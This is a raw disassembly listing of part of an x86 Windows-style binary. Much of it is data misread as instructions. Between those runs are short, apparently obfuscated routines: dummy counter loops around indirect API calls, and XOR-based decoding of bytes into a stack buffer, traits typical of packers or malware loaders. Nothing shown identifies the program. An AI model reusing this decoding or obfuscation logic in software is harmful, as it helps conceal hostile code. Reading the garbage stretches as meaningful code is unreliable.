  40387c:	js     0x403892
  40387e:	scas   eax,DWORD PTR es:[edi]
  40387f:	pop    esi
  403880:	xor    BYTE PTR [ecx],bl
  403882:	(bad)  
  403883:	rcr    BYTE PTR [esi-0x1aa57f4c],0x47
  40388a:	imul   ebx,DWORD PTR [esi+0x23],0x53
  40388e:	gs pop ds
  403890:	call   0x5e1d616b
  403895:	and    eax,0x6de0174d
  40389a:	cdq    
  40389b:	sbb    edi,DWORD PTR [edx+0x2b84d199]
  4038a1:	data16 mov dl,0x29
  4038a4:	es xchg ebp,eax
  4038a6:	sub    DWORD PTR [ebx],0xb00b67ed
  4038ac:	jns    0x403879
  4038ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038af:	mov    al,0x89
  4038b1:	mov    eax,0xb7f270c
  4038b7:	repnz lea esp,[edi-0x7f]
  4038bb:	call   0x72a38bfd
  4038c0:	mov    ah,0x4d
  4038c2:	mov    bl,0xf2
  4038c4:	aad    0xa2
  4038c6:	and    ch,0x13
  4038c9:	jp     0x4038de
  4038cb:	in     eax,dx
  4038cc:	add    dl,BYTE PTR [edx]
  4038ce:	jbe    0x403850
  4038d0:	dec    DWORD PTR [edi-0x4f]
  4038d3:	js     0x4038d3
  4038d5:	aam    0xf3
  4038d7:	xchg   esp,eax
  4038d8:	cwde   
  4038d9:	sub    BYTE PTR [edi-0x1950a035],bh
  4038df:	test   eax,0xadbfa11c
  4038e4:	xor    DWORD PTR [eax],esp
  4038e6:	push   esp
  4038e7:	fnsave [ebx]
  4038e9:	rol    DWORD PTR [ebx],0xc2
  4038ec:	mov    al,BYTE PTR [ebx+eax*1+0x32729c]
  4038f3:	mov    BYTE PTR [edi+esi*1],al
  4038f6:	mov    eax,DWORD PTR [ebp-0x4]
  4038f9:	xor    eax,ecx
  4038fb:	lea    edx,[edx+eax*1+0x32729c]
  403902:	mov    eax,DWORD PTR [ebp-0x4]
  403905:	xor    eax,ecx
  403907:	mov    esi,0xffcd8d64
  40390c:	sub    esi,eax
  40390e:	add    esi,DWORD PTR [ebp+0x10]
  403911:	cmp    edx,esi
  403913:	jbe    0x4029f8
  403919:	pop    ebx
  40391a:	mov    eax,0xf89c8530
  40391f:	pop    edi
  403920:	pop    esi
  403921:	leave  
  403922:	ret    0xc
  403925:	push   ebp
  403926:	mov    ebp,esp
  403928:	sub    esp,0x58
  40392b:	mov    ecx,DWORD PTR [ebp+0x8]
  40392e:	mov    DWORD PTR ds:0x43442d,0x11
  403938:	cmp    DWORD PTR ds:0x43442d,0x0
  40393f:	je     0x40397b
  403945:	cmp    DWORD PTR ds:0x43442d,0x17
  40394c:	jne    0x403960
  403952:	push   0x43437a
  403957:	push   DWORD PTR [ebp-0x24]
  40395a:	call   DWORD PTR ds:0x432c26
  403960:	mov    eax,ds:0x43442d
  403965:	dec    eax
  403966:	mov    ds:0x43442d,eax
  40396b:	jmp    0x403938
  403970:	mov    eax,ds:0x432dca
  403975:	add    DWORD PTR ds:0x432de2,eax
  40397b:	mov    eax,0x8a3e
  403980:	xor    ax,WORD PTR [ecx+0x20]
  403984:	mov    ecx,0x3b04
  403989:	adc    DWORD PTR ds:0x4326f4,0x34fe
  403993:	add    ax,cx
  403996:	movzx  ecx,BYTE PTR ds:0x43441d
  40399d:	sub    DWORD PTR ds:0x4343a2,ecx
  4039a3:	movzx  eax,ax
  4039a6:	adc    ecx,DWORD PTR ds:0x434429
  4039ac:	mov    DWORD PTR [ebp-0xc],eax
  4039af:	and    ecx,0x4bd2
  4039b5:	mov    BYTE PTR [ebp-0x1],0x7f
  4039b9:	xor    ecx,ecx
  4039bb:	or     ecx,DWORD PTR ds:0x434396
  4039c1:	xor    ecx,DWORD PTR ds:0x43439a
  4039c7:	mov    DWORD PTR ds:0x434396,ecx
  4039cd:	lea    eax,[ebp-0x1]
  4039d0:	mov    DWORD PTR ds:0x432dbe,0x10
  4039da:	cmp    DWORD PTR ds:0x432dbe,0x0
  4039e1:	je     0x403a23
  4039e7:	cmp    DWORD PTR ds:0x432dbe,0x1d
  4039ee:	jne    0x403a11
  4039f4:	push   0x43438a
  4039f9:	push   0x43275d
  4039fe:	push   DWORD PTR [ebp-0xc]
  403a01:	push   0x5939
  403a06:	push   0x4c17
  403a0b:	call   DWORD PTR ds:0x432c2a
  403a11:	mov    ecx,DWORD PTR ds:0x432dbe
  403a17:	dec    ecx
  403a18:	mov    DWORD PTR ds:0x432dbe,ecx
  403a1e:	jmp    0x4039da
  403a23:	mov    DWORD PTR [ebp-0x10],eax
  403a26:	mov    al,BYTE PTR [ebp-0x1]
  403a29:	adc    DWORD PTR ds:0x4326f4,ecx
  403a2f:	mov    ecx,DWORD PTR [ebp-0x10]
  403a32:	xor    al,0x47
  403a34:	sub    al,0x37
  403a36:	and    DWORD PTR ds:0x43437e,0x4d53
  403a40:	mov    BYTE PTR [ecx],al
  403a42:	mov    DWORD PTR ds:0x432dde,0x1b
  403a4c:	cmp    DWORD PTR ds:0x432dde,0x0
  403a53:	je     0x403ab0
  403a59:	cmp    DWORD PTR ds:0x432dde,0xc
  403a60:	jne    0x403a7c
  403a66:	push   0x432de6
  403a6b:	push   DWORD PTR [ebp-0x28]
  403a6e:	push   0x43439e
  403a73:	push   DWORD PTR [ebp-0x28]
  403a76:	call   DWORD PTR ds:0x432c2e
  403a7c:	cmp    DWORD PTR ds:0x432dde,0xd
  403a83:	jne    0x403a98
  403a89:	xor    ecx,ecx
  403a8b:	xor    ecx,DWORD PTR ds:0x432dde
  403a91:	dec    ecx
  403a92:	mov    DWORD PTR ds:0x432dde,ecx
  403a98:	mov    ecx,DWORD PTR ds:0x432dde
  403a9e:	dec    ecx
  403a9f:	mov    DWORD PTR ds:0x432dde,ecx
  403aa5:	jmp    0x403a4c
  403aaa:	and    ecx,0x3444
  403ab0:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403ab7:	mov    DWORD PTR [ebp-0x10],0xf89c8530
  403abe:	add    DWORD PTR ds:0x43439a,edi
  403ac4:	mov    eax,DWORD PTR [ebp-0x8]
  403ac7:	or     DWORD PTR ds:0x434396,ecx
  403acd:	mov    ecx,0x7510855
  403ad2:	jmp    0x403c17
  403ad7:	and    eax,0x555995f7
  403adc:	pop    ecx
  403add:	icebp  
  403ade:	jae    0x403a7c
  403ae0:	lods   eax,DWORD PTR ds:[esi]
  403ae1:	imul   ebp,DWORD PTR [ebx],0xffffffc3
  403ae4:	ja     0x403aca
  403ae6:	jns    0x403ad4
  403ae8:	push   ds
  403ae9:	jo     0x403b5b
  403aeb:	sbb    BYTE PTR [edi+0x70],bh
  403aee:	jo     0x403b22
  403af0:	popf   
  403af1:	test   eax,0x986b0eef
  403af6:	pusha  
  403af7:	out    dx,al
  403af8:	jb     0x403b6f
  403afa:	push   es
  403afb:	adc    eax,0xd52b8035
  403b00:	cmp    eax,0xd86e5d61
  403b05:	pop    edx
  403b06:	dec    ebp
  403b07:	inc    eax
  403b08:	mov    cl,BYTE PTR [esi+0x6e]
  403b0b:	or     DWORD PTR [ecx+esi*1],eax
  403b0e:	stos   DWORD PTR es:[edi],eax
  403b0f:	mov    ecx,0x8462af11
  403b14:	pop    es
  403b15:	add    ebp,eax
  403b17:	and    bl,BYTE PTR [edi+eax*2+0xdc6909f]
  403b1e:	push   ebx
  403b1f:	xor    al,0xf5
  403b21:	mov    dh,0x1a
  403b23:	mov    bl,bh
  403b25:	cdq    
  403b26:	jns    0x403b6f
  403b28:	jle    0x403ab8
  403b2a:	in     al,dx
  403b2b:	fwait
  403b2c:	xchg   edx,eax
  403b2d:	out    dx,al
  403b2e:	mov    bl,0xf4
  403b30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b31:	cdq    
  403b32:	sbb    DWORD PTR [esi-0x47],ebp
  403b35:	cmp    DWORD PTR [ecx-0x57],esp
  403b38:	fst    st(6)
  403b3a:	inc    esi
  403b3b:	adc    ebp,ecx
  403b3d:	mov    eax,ds:0x6954067c
  403b42:	je     0x403b52
  403b44:	test   DWORD PTR [esi-0x46ddcd17],eax
  403b4a:	and    eax,0xd22f5657
  403b4f:	mov    edi,0x5de26e24
  403b54:	pop    ss
  403b55:	mov    dh,0xf4
  403b57:	mov    ds:0x3dfdf803,eax
  403b5c:	test   BYTE PTR [esi-0x6],bh
  403b5f:	pop    edi
  403b60:	test   al,0x3c
  403b62:	stos   DWORD PTR es:[edi],eax
  403b63:	ficom  DWORD PTR [edx]
  403b65:	push   cs
  403b66:	imul   eax,ecx,0x4e
  403b69:	shr    BYTE PTR [eax+eiz*4+0x3f],cl
  403b6d:	xor    ch,dh
  403b6f:	ins    DWORD PTR es:[edi],dx
  403b70:	and    BYTE PTR [ebx+edx*8-0x7ad1d089],bh
  403b77:	icebp  
  403b78:	nop
  403b79:	adc    dh,BYTE PTR [edx]
  403b7b:	mov    eax,0x2fbc856b
  403b81:	mov    ebx,0xa67db5fc
  403b86:	jno    0x403bb7
  403b88:	fbld   TBYTE PTR [eax-0x24]
  403b8b:	sub    BYTE PTR ds:0xe1319937,al
  403b91:	xor    ch,ah
  403b93:	xor    al,ch
  403b95:	pop    ss
  403b96:	ja     0x403b8d
  403b98:	xlat   BYTE PTR ds:[ebx]
  403b99:	xchg   edi,eax
  403b9a:	data16 fdiv QWORD PTR [esi-0x3c]
  403b9e:	fbld   TBYTE PTR [ebx+0x22]
  403ba1:	jg     0x403bce
  403ba3:	ds push ds
  403ba5:	retf   0xf0e5
  403ba8:	shl    bh,0xc9
  403bab:	popf   
  403bac:	sbb    al,0x44
  403bae:	mov    ds:0xd7ccfbcb,al
  403bb3:	mov    ebx,0x70a3a725
  403bb8:	fidivr WORD PTR [ecx-0x10]
  403bbb:	mov    ss,WORD PTR [edi]
  403bbd:	sbb    BYTE PTR [ebx],0x57
  403bc0:	jae    0x403b55
  403bc2:	imul   eax,DWORD PTR [edx+ecx*1],0x205d2f3d
  403bc9:	(bad)  
  403bca:	fiadd  DWORD PTR [ebx+ecx*2]
  403bcd:	xor    eax,0xe328f132
  403bd2:	cmp    dl,BYTE PTR [eax+0x6a]
  403bd5:	daa    
  403bd6:	int    0x21
  403bd8:	mov    bh,0xaf
  403bda:	push   edx
  403bdb:	sub    BYTE PTR [eax],bh
  403bdd:	cmp    DWORD PTR [edi+0x45e6ff88],eax
  403be3:	pop    ss
  403be4:	cmp    DWORD PTR [edx+0x790ab9a5],0xb8394bb9
  403bee:	push   0xffffff8c
  403bf0:	mov    BYTE PTR [esi],bh
  403bf2:	push   eax
  403bf3:	sbb    BYTE PTR [ebp-0x917a89b],dl
  403bf9:	xor    BYTE PTR [ecx-0x35bf7b00],cl
  403bff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c00:	dec    eax
  403c01:	xor    al,0x4c
  403c03:	shl    BYTE PTR [ecx+0x8dad186],0x71
  403c0a:	outs   dx,BYTE PTR ds:[esi]
  403c0b:	pop    esp
  403c0c:	mov    cl,0xd4
  403c0e:	add    al,0xa9
  403c10:	inc    esp
  403c11:	bnd jg 0x403bbd
  403c14:	dec    esp
  403c15:	dec    ebp
  403c16:	rcl    DWORD PTR [esi+0x46],cl
  403c19:	xor    eax,ecx
  403c1b:	mov    esi,0x32729c
  403c20:	sbb    DWORD PTR ds:0x434376,0x434421
  403c2a:	add    eax,esi
  403c2c:	mov    DWORD PTR ds:0x432dd6,0x19db
  403c36:	jmp    0x403c4d
  403c3b:	mov    DWORD PTR ds:0x43436a,0x1bda
  403c45:	mov    dl,BYTE PTR [ebp-0x1]
  403c48:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403c4c:	inc    eax
  403c4d:	cmp    eax,0x40
  403c50:	jmp    0x403d95
  403c55:	sbb    bl,BYTE PTR [ebx+eiz*1+0x1981a102]
  403c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c5d:	scas   al,BYTE PTR es:[edi]
  403c5e:	xchg   ecx,eax
  403c5f:	sub    al,0x28
  403c61:	lahf   
  403c62:	xchg   BYTE PTR [esi-0x52],cl
  403c65:	xchg   esp,eax
  403c66:	sbb    eax,0x7f187070
  403c6b:	jo     0x403cdd
  403c6d:	aad    0xb6
  403c6f:	test   ch,bl
  403c71:	arpl   WORD PTR [edx-0x14e19f52],di
  403c77:	cmp    ebx,DWORD PTR [esi]
  403c79:	xchg   edx,eax
  403c7a:	and    bh,BYTE PTR [ebx+edi*1-0x29]
  403c7e:	jno    0x403c76
  403c80:	(bad)  
  403c81:	mov    edi,0xfcfc8673
  403c86:	lods   al,BYTE PTR ds:[esi]
  403c87:	mov    dl,0x6c
  403c89:	sbb    BYTE PTR [eax-0x6d90a233],0x61
  403c90:	arpl   bx,bp
  403c92:	push   esp
  403c93:	lock jb 0x403cb6
  403c96:	mov    esp,0xac77f846
  403c9b:	dec    esi
  403c9c:	mov    bh,0x74
  403c9e:	jge    0x403c93
  403ca0:	mov    edx,0x9754d21
  403ca5:	mov    ch,al
  403ca7:	dec    edx
  403ca8:	leave  
  403ca9:	outs   dx,BYTE PTR ds:[esi]
  403caa:	out    0x9e,al
  403cac:	and    DWORD PTR [eax],edx
  403cae:	sub    edi,ebp
  403cb0:	mul    BYTE PTR [ebx+0x7d9f1bae]
  403cb6:	cmp    BYTE PTR [ebx+0x574b0e1d],0x45
  403cbd:	imul   ebp,DWORD PTR fs:[ebx+eax*2],0xffffffe8
  403cc2:	loope  0x403c60
  403cc4:	or     ebp,edi
  403cc6:	fs pusha 
  403cc8:	mov    eax,ds:0xc9d1fb9c
  403ccd:	sahf   
  403cce:	scas   eax,DWORD PTR es:[edi]
  403ccf:	mov    esp,ebx
  403cd1:	adc    ah,BYTE PTR [ebx+0x3fc7a0d5]
  403cd7:	jbe    0x403c5a
  403cd9:	cli    
  403cda:	adc    BYTE PTR [ebx+0x238cb957],bh
  403ce0:	xchg   edi,eax
  403ce1:	ss hlt 
  403ce3:	nop
  403ce4:	pop    edx
  403ce5:	mov    dl,0xe1
  403ce7:	scas   al,BYTE PTR es:[edi]
  403ce8:	add    al,0x40
  403cea:	cdq    
  403ceb:	in     eax,0xa4
  403ced:	fadd   DWORD PTR [ecx+0x1e]
  403cf0:	arpl   ax,si
  403cf2:	and    al,0xbd
  403cf4:	aaa    
  403cf5:	shl    DWORD PTR [ebx+0x3105affe],0x3d
  403cfc:	jmp    0x2ec4:0x7f628959
  403d03:	push   eax
  403d04:	mov    edi,0x2c2c0345
  403d09:	popf   
  403d0a:	call   0x23e38469
  403d0f:	lock pop es
  403d11:	popa   
  403d12:	jg     0x403d2d
  403d14:	mov    ch,bl
  403d16:	and    BYTE PTR [ecx+eax*2+0x3f523e58],al
  403d1d:	iret   
  403d1e:	mov    cl,0xba
  403d20:	mov    esp,0x22bea452
  403d25:	pop    ecx
  403d26:	xor    dl,BYTE PTR [edi+0x2f]
  403d29:	mov    ecx,0x831754a6
  403d2e:	xchg   esp,eax
  403d2f:	jecxz  0x403d36
  403d31:	mov    ds:0xdfcfe278,al
  403d36:	mov    esp,cr0
  403d39:	(bad)  
  403d3b:	dec    edi
  403d3c:	cdq    
  403d3d:	ss jnp 0x403d0a
  403d40:	pop    ebx
  403d41:	pusha  
  403d42:	fnstenv [ebx]
  403d44:	jmp    0x1874:0xc356d510
  403d4b:	aas    
  403d4c:	adc    ecx,DWORD PTR [ebx+0x79]
  403d4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d50:	sub    BYTE PTR [edx+0x27],dh
  403d53:	int    0x33
  403d55:	(bad)  
  403d56:	sbb    BYTE PTR [ebp+0x72],bl
  403d59:	xchg   edx,eax
  403d5a:	hlt    
  403d5b:	inc    edx
  403d5c:	inc    esp
  403d5d:	nop
  403d5e:	retf   0x8036
  403d61:	and    eax,0x46ce956f
  403d66:	and    dh,ch
  403d68:	aad    0xa3
  403d6a:	fiadd  WORD PTR [ebx-0xe]
  403d6d:	enter  0xf079,0x66
  403d71:	add    bl,dl
  403d73:	and    BYTE PTR [ebx+edi*8],dl
  403d76:	push   0xffffffca
  403d78:	xchg   edi,eax
  403d79:	cld    
  403d7a:	data16 mov ?,WORD PTR [esi]
  403d7d:	jb     0x403db6
  403d7f:	sub    ah,BYTE PTR [ecx]
  403d81:	mov    bh,0x12
  403d83:	xor    al,0x24
  403d85:	mov    fs,WORD PTR [ecx]
  403d87:	(bad)  
  403d88:	fcmovbe st,st(1)
  403d8a:	cli    
  403d8b:	rcl    BYTE PTR [esi],0xe5
  403d8e:	xlat   BYTE PTR ds:[ebx]
  403d8f:	sbb    dh,BYTE PTR [edi+0x2d0b7aa8]
  403d95:	jb     0x403c3b
  403d9b:	mov    edx,DWORD PTR [ebp-0x8]
  403d9e:	and    DWORD PTR ds:0x43439a,0x0
  403da8:	jmp    0x403dbb
  403dad:	xor    eax,eax
  403daf:	add    eax,DWORD PTR ds:0x43439a
  403db5:	inc    eax
  403db6:	mov    ds:0x43439a,eax
  403dbb:	cmp    DWORD PTR ds:0x43439a,0x13
  403dc2:	jae    0x403dfe
  403dc8:	cmp    DWORD PTR ds:0x43439a,0xc
  403dcf:	jne    0x403dde
  403dd5:	push   DWORD PTR [ebp-0x1c]
  403dd8:	call   DWORD PTR ds:0x4329be
  403dde:	cmp    DWORD PTR ds:0x43439a,0xb
  403de5:	jne    0x403df9
  403deb:	xor    eax,eax
  403ded:	add    eax,DWORD PTR ds:0x43439a
  403df3:	inc    eax
  403df4:	mov    ds:0x43439a,eax
  403df9:	jmp    0x403dad
  403dfe:	mov    eax,DWORD PTR [ebp-0xc]
  403e01:	xor    edx,ecx
  403e03:	add    edx,esi
  403e05:	cmp    edx,eax
  403e07:	jmp    0x403f4c
  403e0c:	inc    ecx
  403e0d:	sub    al,0xb8
  403e0f:	xor    BYTE PTR [ebp+0x72],0x41
  403e13:	jmp    0x403d9a
  403e15:	inc    ebp
  403e16:	mov    al,0x72
  403e18:	mov    bl,0x86
  403e1a:	or     al,0xb
  403e1c:	mov    esp,0x1870701c
  403e21:	jg     0x403e93
  403e23:	jo     0x403e3c
  403e25:	dec    ebx
  403e26:	retf   
  403e27:	outs   dx,BYTE PTR ds:[esi]
  403e28:	dec    ecx
  403e29:	ins    BYTE PTR es:[edi],dx
  403e2a:	js     0x403dcb
  403e2c:	out    dx,eax
  403e2d:	mov    ah,ah
  403e2f:	or     esp,0x7b5dfa67
  403e35:	adc    al,0xec
  403e37:	and    bh,BYTE PTR ds:0xf679b4c3
  403e3d:	nop
  403e3e:	test   edi,edi
  403e40:	gs push cs
  403e42:	jg     0x403e36
  403e44:	sti    
  403e45:	cld    
  403e46:	ja     0x403e08
  403e48:	mov    bh,al
  403e4a:	push   0x45de909d
  403e4f:	cmp    DWORD PTR [ecx+0x6a41db74],ebp
  403e55:	mov    ds:0x839622e,eax
  403e5a:	jnp    0x403ecb
  403e5c:	push   ds
  403e5d:	mov    dl,0xe4
  403e5f:	mov    eax,0x43bf06ee
  403e64:	mov    eax,ds:0x7caa9a3
  403e69:	jecxz  0x403e73
  403e6b:	mov    bh,0xe9
  403e6d:	pop    edx
  403e6e:	enter  0x9974,0x8
  403e72:	aaa    
  403e73:	lea    ebx,[edx]
  403e75:	mov    bl,0x60
  403e77:	dec    esp
  403e78:	adc    bh,dl
  403e7a:	dec    BYTE PTR [edx+0x5c73dcc8]
  403e80:	ins    DWORD PTR es:[edi],dx
  403e81:	clc    
  403e82:	popa   
  403e83:	in     al,0x90
  403e85:	jo     0x403e59
  403e87:	cld    
  403e88:	xor    ch,BYTE PTR [ebx+0x425b44ec]
  403e8e:	ds sub esi,ebx
  403e91:	daa    
  403e92:	sahf   
  403e93:	cli    
  403e94:	lock clc 
  403e96:	inc    edi
  403e97:	jno    0x403ec2
  403e99:	rol    BYTE PTR [esi],cl
  403e9b:	push   edx
  403e9c:	out    dx,eax
  403e9d:	aam    0x7e
  403e9f:	(bad)  
  403ea0:	inc    BYTE PTR [ecx+0x74]
  403ea3:	in     eax,0x1e
  403ea5:	leave  
  403ea6:	(bad)  
  403ea7:	xor    al,0x1b
  403ea9:	test   bl,ch
  403eab:	jo     0x403ea0
  403ead:	sbb    eax,0xa7a5c9e5
  403eb2:	dec    edi
  403eb3:	inc    edi
  403eb4:	rcl    edi,1
  403eb6:	mov    bx,ax
  403eb9:	test   DWORD PTR [esi],edi
  403ebb:	inc    edx
  403ebc:	xlat   BYTE PTR ds:[ebx]
  403ebd:	cs jno 0x403e7b
  403ec0:	mov    bh,0xf
  403ec2:	pop    eax
  403ec3:	jle    0x403f13
  403ec5:	jmp    0x403e49
  403ec7:	push   ebp
  403ec8:	scas   eax,DWORD PTR es:[edi]
  403ec9:	ds dec esp
  403ecb:	dec    edi
  403ecc:	out    0xd7,eax
  403ece:	inc    ebx
  403ecf:	std    
  403ed0:	sub    edx,DWORD PTR [ebx]
  403ed2:	retf   0x94d5
  403ed5:	aas    
  403ed6:	and    dh,BYTE PTR [edi+0x67]
  403ed9:	inc    esi
  403eda:	lock cmp al,0xd1
  403edd:	inc    ecx
  403ede:	push   0xedf5dcdf
  403ee3:	aas    
  403ee4:	inc    ecx
  403ee5:	pop    esp
  403ee6:	sbb    eax,0x570dd299
  403eeb:	add    BYTE PTR [esi+0x463d13ce],dh
  403ef1:	loop   0x403edd
  403ef3:	push   eax
  403ef4:	aas    
  403ef5:	jle    0x403f33
  403ef7:	inc    edi
  403ef8:	xchg   ebx,eax
  403ef9:	sbb    DWORD PTR [edx+0x6dd1ff04],esp
  403eff:	clc    
  403f00:	aaa    
  403f01:	hlt    
  403f02:	xor    BYTE PTR [eax],0xb2
  403f05:	js     0x403f08
  403f07:	les    edx,FWORD PTR ds:0x60f353fa
  403f0d:	jecxz  0x403ee5
  403f0f:	push   esp
  403f10:	or     DWORD PTR [esp+esi*2],esi
  403f13:	nop
  403f14:	xchg   edi,eax
  403f15:	cs dec eax
  403f17:	stc    
  403f18:	push   ecx
  403f19:	pop    esp
  403f1a:	test   DWORD PTR [esi],esi
  403f1c:	jmp    0x403f26
  403f1e:	mov    al,BYTE PTR [ecx+ecx*1]
  403f21:	data16 in al,0x50
  403f24:	les    esi,FWORD PTR [edi-0x578e1ef4]
  403f2a:	mov    ebp,edx
  403f2c:	pop    es
  403f2d:	xchg   bh,cl
  403f2f:	and    ebx,DWORD PTR es:[eax]
  403f32:	aaa    
  403f33:	icebp  
  403f34:	fwait
  403f35:	ins    DWORD PTR es:[edi],dx
  403f36:	xor    BYTE PTR [esi],cl
  403f38:	add    cl,BYTE PTR [edi]
  403f3a:	(bad)  
  403f3b:	pop    ebp
  403f3c:	or     dh,BYTE PTR [edi]
  403f3e:	xor    eax,0x53b8d0e2
  403f43:	dec    eax
  403f44:	sbb    al,0x4b
  403f46:	jl     0x403f78
  403f48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f49:	aad    0x8a
  403f4b:	fmul   DWORD PTR [edi]
  403f4d:	test   BYTE PTR [ebp+0x53000001],al
  403f53:	push   edi
  403f54:	mov    edi,DWORD PTR [ebp+0x8]
  403f57:	mov    eax,0x8a3e
  403f5c:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403f61:	mov    edi,0x3b04
  403f66:	add    ax,di
  403f69:	movzx  eax,ax
  403f6c:	mov    DWORD PTR [ebp-0x14],eax
  403f6f:	mov    eax,DWORD PTR [ebp+0x8]
  403f72:	movzx  eax,WORD PTR [eax+edx*4]
  403f76:	xor    eax,0x8a3e
  403f7b:	add    eax,edi
  403f7d:	mov    edi,DWORD PTR [ebp-0x14]
  403f80:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403f84:	mov    eax,DWORD PTR [ebp-0xc]
  403f87:	inc    edx
  403f88:	cmp    edx,eax
  403f8a:	jne    0x403f54
  403f90:	pop    edi
  403f91:	jmp    0x4040d6
  403f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f97:	fisubr DWORD PTR [edi-0x598e8c4b]
  403f9d:	jmp    0x4923f392
  403fa2:	lods   eax,DWORD PTR ds:[esi]
  403fa3:	inc    ebp
  403fa4:	inc    esp
  403fa5:	mul    DWORD PTR [ebx+ebx*1+0x70]
  403fa9:	jo     0x403fc3
  403fab:	jg     0x40401d
  403fad:	jo     0x403faa
  403faf:	pop    eax
  403fb0:	pop    ds
  403fb1:	push   eax
  403fb2:	adc    edi,DWORD PTR [ebp+0x6c]
  403fb5:	shl    DWORD PTR [ecx+0x64aea8eb],cl
  403fbb:	popf   
  403fbc:	fs cmp al,0x72
  403fbf:	daa    
  403fc0:	sub    ebp,ecx
  403fc2:	or     al,0x28
  403fc4:	(bad)  
  403fc5:	and    ebp,ecx
  403fc7:	loope  0x404036
  403fc9:	add    bh,BYTE PTR [ebx+0x2e]
  403fcc:	mov    bh,0x84
  403fce:	dec    ebp
  403fcf:	xchg   edi,eax
  403fd0:	sahf   
  403fd1:	jne    0x403fc0
  403fd3:	adc    ecx,DWORD PTR [ecx]
  403fd5:	mov    ch,0x1b
  403fd7:	cdq    
  403fd8:	or     al,0x67
  403fda:	or     al,0x6d
  403fdc:	je     0x403f82
  403fde:	je     0x40404d
  403fe0:	mov    cl,0xf8
  403fe2:	gs push esp
  403fe4:	or     eax,0xd5e27388
  403fe9:	jo     0x403fc7
  403feb:	(bad)  
  403fec:	stos   BYTE PTR es:[edi],al
  403fed:	retf   
  403fee:	cmp    edi,DWORD PTR [ebx+ecx*2+0x1d2bb5f5]
  403ff5:	dec    edi
  403ff6:	lods   eax,DWORD PTR ds:[esi]
  403ff7:	in     al,dx
  403ff8:	and    BYTE PTR [ebx-0x27],bl
  403ffb:	dec    eax
  403ffc:	pop    ecx
  403ffd:	jbe    0x403fbe
  403fff:	cmp    ebp,ebp
  404001:	sbb    eax,0xa699d6f2
  404006:	adc    dh,BYTE PTR [esi]
  404008:	mov    esi,0xaa10a3d
  40400d:	and    eax,DWORD PTR [ebp-0x25]
  404010:	dec    eax
  404011:	into   
  404012:	stos   DWORD PTR es:[edi],eax
  404013:	sub    al,0x5
  404015:	cs lock cs call 0xfe5eec5d
  40401d:	xchg   BYTE PTR [edx-0x6f],al
  404020:	iret   
  404021:	call   0xbe9b:0xd3cc760b
  404028:	mov    ecx,ebp
  40402a:	retf   
  40402b:	or     DWORD PTR [edx+0x3f],esp
  40402e:	pop    ecx
  40402f:	ret    
  404030:	push   ds
  404031:	(bad)  
  404032:	jp     0x404017
  404034:	xor    ecx,DWORD PTR [ecx]
  404036:	cmp    eax,0x8d137927
  40403b:	lahf   
  40403c:	fs cmp eax,0x31a27346
  404042:	xor    DWORD PTR [edi],ebp
  404044:	jp     0x403fe8
  404046:	icebp  
  404047:	cdq    
  404048:	xchg   ebx,eax
  404049:	std    
  40404a:	(bad)  
  40404b:	adc    al,0xd4
  40404d:	std    
  40404e:	dec    edx
  40404f:	jmp    0x282a:0xb53edecb
  404056:	ret    
  404057:	shr    ch,0xd8
  40405a:	mov    ah,0xaf
  40405c:	jmp    0x8026e63d
  404061:	clc    
  404062:	and    eax,0x389d1670
  404067:	sbb    ebx,DWORD PTR [edi+0x57]
  40406a:	push   esp
  40406b:	pop    edx
  40406c:	pop    ebx
  40406d:	adc    ch,BYTE PTR [eax-0x52]
  404070:	addr16 dec eax
  404072:	cwde   
  404073:	packssdw mm4,QWORD PTR [ebx]
  404076:	xlat   BYTE PTR ds:[ebx]
  404077:	dec    ebx
  404078:	jb     0x40408f
  40407a:	lahf   
  40407b:	loop   0x404024
  40407d:	jne    0x404023
  40407f:	lds    edx,FWORD PTR [ebp-0x68]
  404082:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404083:	and    DWORD PTR [ebx],0xffffffa5
  404086:	mov    DWORD PTR [edi],ecx
  404088:	sbb    esi,DWORD PTR [esi+0x6960517f]
  40408e:	(bad)
  404091:	jecxz  0x4040de
  404093:	ret    0xb38b
  404096:	xchg   ecx,eax
  404097:	sub    bh,BYTE PTR [ecx]
  404099:	mov    ch,0xfc
  40409b:	mov    edi,0x57e11497
  4040a0:	and    eax,0x3bccbdc8
  4040a5:	lods   eax,DWORD PTR ds:[esi]
  4040a6:	push   esp
  4040a7:	jbe    0x404050
  4040a9:	out    dx,al
  4040aa:	mov    bh,0x2b
  4040ac:	adc    eax,0x53e1d384
  4040b1:	xor    esi,DWORD PTR [ebp-0x4]
  4040b4:	mov    cl,0xef
  4040b6:	ins    DWORD PTR es:[edi],dx
  4040b7:	pop    ebx
  4040b8:	jecxz  0x4040cf
  4040ba:	inc    esi
  4040bb:	jmp    0x7efe:0x16739e4c
  4040c2:	xchg   DWORD PTR [esi],ebx
  4040c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040c5:	cmp    BYTE PTR [ebp+ebp*2+0x2b],ch
  4040c9:	lock lods eax,DWORD PTR ds:[esi]
  4040cb:	ins    BYTE PTR es:[edi],dx
  4040cc:	mov    dl,0x1d
  4040ce:	test   BYTE PTR [ecx],dh
  4040d0:	mov    gs,WORD PTR [ebx+eax*1+0x2b]
  4040d4:	shl    BYTE PTR [esi-0x7ba74a5],1
  4040da:	mov    edx,DWORD PTR [ebp+0x10]
  4040dd:	jmp    0x404222
  4040e2:	aaa    
  4040e3:	ins    DWORD PTR es:[edi],dx
  4040e4:	pop    ss
  4040e5:	int3   
  4040e6:	push   ebp
  4040e7:	jb     0x4040dc
  4040e9:	jno    0x404096
  4040eb:	pop    ebx
  4040ec:	imul   edi,DWORD PTR [edx+0x15a79461],0xc
  4040f3:	sbb    DWORD PTR [eax+0x70],esi
  4040f6:	sbb    BYTE PTR [edi+0x70],bh
  4040f9:	jo     0x40413f
  4040fb:	jecxz  0x404080
  4040fd:	pushf  
  4040fe:	xchg   edx,eax
  4040ff:	push   ds
